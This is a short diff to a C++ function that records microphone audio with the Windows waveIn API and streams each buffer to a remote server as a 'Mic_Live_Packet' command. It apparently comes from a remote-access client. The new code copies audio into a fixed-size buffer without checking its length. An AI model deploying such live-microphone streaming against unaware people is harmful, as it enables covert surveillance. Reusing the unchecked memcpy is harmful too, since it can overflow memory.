@@ -112,26 +112,26 @@ void Mod_Mic::m_LiveMicTh() {
 
     //Real time
     // Bucle principal de captura y envío de audio
+    char newBuffer[BUFFER_SIZE + 4];
     while (this->isLiveMic) {
         for (int i = 0; i < NUM_BUFFERS; i++) {
             WAVEHDR& h = headers[i];
             if (h.dwFlags & WHDR_DONE) {
                 // Enviar datos de audio al servidor
-                std::string strPaquete = std::to_string(EnumComandos::Mic_Live_Packet);
-                if (h.dwBytesRecorded > 0) {
-                    std::cout << h.lpData << std::endl;
-                    strPaquete.append(1, '\\');
-                    strPaquete.append(h.lpData, h.dwBufferLength);
+                memset(newBuffer, 0, sizeof(newBuffer));
 
-                    this->ptr_copy->cSend(this->sckSocket, strPaquete.c_str(), strPaquete.size(), 0, false);
-                    Sleep(50);
-                }else {
-                    std::cout << "No se grabo nada\n";
-                }
-                //Sleep(10);
-                //send(clientSocket, h.lpData, h.dwBufferLength, 0);
+                //char* nTest = new char[h.dwBufferLength];
+                //std::memcpy(nTest, h.lpData, h.dwBufferLength);
 
-                // Preparar y reutilizar buffer
+                std::strcpy(newBuffer, std::to_string(EnumComandos::Mic_Live_Packet).c_str()); 
+                std::strcpy(newBuffer + 3, "\\");
+                std::memcpy(newBuffer + 4, h.lpData, h.dwBufferLength);
+                //std::memcpy(newBuffer + 4, nTest, h.dwBufferLength);
+
+                this->ptr_copy->cSend(this->sckSocket, newBuffer, sizeof(newBuffer), 0, false);
+                Sleep(10);
+                //delete[] nTest;
+
                 h.dwFlags = 0;
                 h.dwBytesRecorded = 0;
                 waveInPrepareHeader(wi, &h, sizeof(h));
